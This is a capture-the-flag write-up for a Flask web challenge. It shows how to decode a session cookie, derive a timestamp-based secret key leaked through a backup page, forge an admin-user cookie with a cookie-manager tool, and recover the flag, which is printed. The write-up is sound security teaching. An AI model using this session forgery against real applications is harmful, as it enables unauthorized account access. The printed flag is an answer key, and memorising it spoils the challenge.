# Flask Session

By: @Jstith

This challenge is designed to show the vulnerability of revealing the session secret key in a Flask application.

## Discover Session Cookie

After clicking around the web app and seeing the visible pages, it should be evident that some sort of server side authentication is taking place to access the messages page. Inspecting your cookies will reveal a flask session cookie with an encoded value.

## Decode Session Cookie

Using a flask cookie session decoding [tool](https://github.com/noraj/flask-session-cookie-manager), you can decode the session cookie to see the value of the cookie. The secret key is not yet known, however.

```
> flask_session_cookie_manager3.py decode -c "eyJuYW1lIjoiZ3Vlc3QifQ.ZkA8Gg.NWjhcBGXOHGUdxikJzWTAdgC8ok"
> b'{"name":"guest"}'
```

At this point, it is evident that the user name must be changed from user to something else. However, to do that we need two things: the correct username and the session key.

## Enumerate

By inspecting the page source, you can see a commented out link to a `/backup` page. Navigating to that page reveals a snippet of flask code, including the code that generates the secret key for the app and the list of allowed users.

```python
from flask import (Flask, flash, redirect, render_template, request, send_from_directory, session, url_for)
from datetime import datetime

app = Flask(__name__)

c = datetime.now() 
f = c.strftime("%Y%m%d%H%M")
app.secret_key = f'THE_REYNOLDS_PAMPHLET-{f}'

allowed_users = ['Jefferson', 'Madison', 'Burr'] # No Federalists Allowed!!!!
```

First, the user list is revealed for which users to target changing the cookie to:
```python
allowed_users = ['Jefferson', 'Madison', 'Burr']
```

The secret key can be derived by using the `/status` endpoint which lists the number of days hours and minutes the website has been running (since August 25th 1797). The uptime should be accurate to the minute of the session key, but users can always try all 60 minutes within the hour if it happens to be off be one.

## Generate custom session cookie

Using the same flask session encoder/decoder from before, we can now create a new session cookie with a valid user to access messages with.

```
> flask_session_cookie_manager3.py encode -t '{"name":"Jefferson"}' -s 'THE_REYNOLDS_PAMPHLET-179708250845'
> eyJuYW1lIjoiSmVmZmVyc29uIn0.ZkA7mw.Uwu41j6AJ-6bWiE6qism_w5vgYM
```

If you go into your cookie manager and replace the provided cookie with our custom one, you can navigate to the messages tab on the website, where you are greeted with the flag.

```
flag{f69f2c087b291b9da9c9fe9219ee130f}
```